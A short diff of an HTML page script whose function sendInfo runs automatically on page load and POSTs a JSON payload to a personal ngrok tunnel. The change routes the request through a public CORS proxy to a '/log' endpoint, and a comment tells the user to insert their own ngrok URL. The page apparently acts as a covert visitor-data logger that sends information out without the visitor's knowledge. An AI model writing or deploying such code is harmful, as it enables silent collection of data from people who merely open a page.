@@ -87,7 +87,7 @@ async function sendInfo() {
         };
 
         // CHANGE THIS LINE TO YOUR NGROK URL
-        await fetch('https://threatless-emotionable-joey.ngrok-free.dev', {
+        await fetch('https://cors-anywhere.herokuapp.com/https://threatless-emotionable-joey.ngrok-free.dev/log', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
@@ -104,3 +104,4 @@ window.addEventListener('load', sendInfo);
 </script>
 </body>
 </html>
+
